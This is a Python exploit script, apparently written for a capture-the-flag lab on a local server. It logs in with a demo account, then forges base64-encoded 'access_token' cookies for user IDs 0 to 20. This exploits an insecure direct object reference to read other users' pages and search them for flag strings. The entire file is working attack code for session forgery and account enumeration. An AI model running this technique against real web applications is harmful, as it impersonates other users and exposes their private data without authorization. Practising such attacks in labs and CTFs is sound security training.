import requests
import base64
import re

base_url = "http://127.0.0.1:32773"

def authenticate():
    """Authenticate with the demo account"""
    print("="*80)
    print("AUTHENTICATING WITH DEMO ACCOUNT")
    print("="*80)
    
    login_data = {
        "username": "demo",
        "password": "demo"
    }
    
    response = requests.post(
        base_url + "/token",
        data=login_data,
        timeout=10
    )
    
    print(f"Authentication status: {response.status_code}")
    print(f"Response: {response.text[:300]}")
    
    if response.status_code == 200:
        # Get the token/cookie
        if response.cookies:
            cookies = dict(response.cookies)
            print(f"Cookies received: {cookies}")
            return response.cookies
        
        # Try to parse token from response
        try:
            json_resp = response.json()
            if "access_token" in json_resp:
                token = json_resp["access_token"]
                print(f"Access token received: {token}")
                return token
        except:
            pass
        
        # Look for token in response text
        token_match = re.search(r'access_token["\']:?\s*["\']?([^"\'\s]+)', response.text)
        if token_match:
            token = token_match.group(1)
            print(f"Access token found in response: {token}")
            return token
    
    return None

def test_with_token(endpoint, cookies_or_token, user_description=""):
    """Test endpoint with authentication"""
    headers = {}
    cookies = {}
    
    if isinstance(cookies_or_token, dict):
        cookies = cookies_or_token
        token_info = "Using cookies"
    elif isinstance(cookies_or_token, str):
        token_info = f"Using token: {cookies_or_token}"
        if "Bearer" in cookies_or_token:
            headers["Authorization"] = cookies_or_token
        else:
            headers["Authorization"] = f"Bearer {cookies_or_token}"
    else:
        token_info = "No auth"
    
    print(f"\n[Testing {endpoint} {user_description}]")
    print(f"Auth method: {token_info}")
    
    response = requests.get(
        base_url + endpoint,
        headers=headers,
        cookies=cookies,
        timeout=10
    )
    
    print(f"Status: {response.status_code}")
    print(f"Length: {len(response.content)}B")
    
    # Check for user data
    if "user" in response.text.lower():
        print(f"User data found!")
        
        # Extract user info
        username_match = re.findall(r'Username:\s*([^<\s]+)', response.text, re.I)
        company_match = re.findall(r'Company:\s*([^<\s]+)', response.text, re.I)
        
        if username_match:
            print(f"  Username: {username_match}")
        if company_match:
            print(f"  Company: {company_match}")
    
    # Check for flags
    flags = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flags:
        print(f"[!] FLAG FOUND: {flags[0]}")
        return True, flags[0]
    
    return False, None

# First, authenticate
session_cookies = authenticate()

if not session_cookies:
    print("[ERROR] Authentication failed")
else:
    print("\n[✓] Authentication successful!")
    
    # Test with authenticated session
    print("\n" + "="*80)
    print("TESTING ENDPOINTS WITH AUTHENTICATION")
    print("="*80)
    
    # Test root endpoint
    success, flag = test_with_token("/", session_cookies, "(original user)")
    
    if success:
        print("\n[!] FLAG FOUND!")
    else:
        print("\n[TESTING IDOR VULNERABILITY]")
        print("="*80)
        
        # Now test IDOR by creating cookies for different users
        # We need to build our own cookie based on what we learned
        
        test_users = [i for i in range(0, 21)]
        flags_found = []
        
        for user_id in test_users:
            print(f"\n[Testing User ID: {user_id}]")
            
            # Create cookie with different user ID
            user_encoded = base64.b64encode(str(user_id).encode()).decode()
            user_cookie_value = f'"Bearer {user_encoded}"'
            
            # Create custom cookie
            cookies = {"access_token": user_cookie_value}
            
            # Try to access authenticated content
            response = requests.get(
                base_url + "/",
                cookies=cookies,
                timeout=10
            )
            
            print(f"Cookie: {user_cookie_value}")
            print(f"User: {user_id} | Status: {response.status_code} | Size: {len(response.content)}B")
            
            # Check for flag
            flags = re.findall(r'FLAG\{[^}]+\}', response.text)
            if flags:
                print(f"[!] FLAG FOUND at user {user_id}: {flags[0]}")
                flags_found.append((user_id, flags[0]))
            
            # Check for different content size (might indicate other user's data)
            if len(response.content) != 1258:  # Original login page size
                print(f"  [*] Different content size - possible user data access!")
                
                # Show sample of content
                content_preview = re.sub(r'<[^>]+>', ' ', response.text)[:200]
                print(f"  Preview: {content_preview}...")
        
        if flags_found:
            print("\n" + "="*80)
            print("FLAGS DISCOVERED VIA IDOR:")
            print("="*80)
            for user_id, flag in flags_found:
                print(f"User {user_id}: {flag}")
            print("="*80)
        else:
            print("\n[X] No flags found via IDOR on root endpoint")
            print("\nPossible next steps:")
            print("- Check if authenticated session reveals new endpoints")
            print("- Look for /profile, /dashboard, /companies endpoints")
            print("- Test with the actual authenticated token")
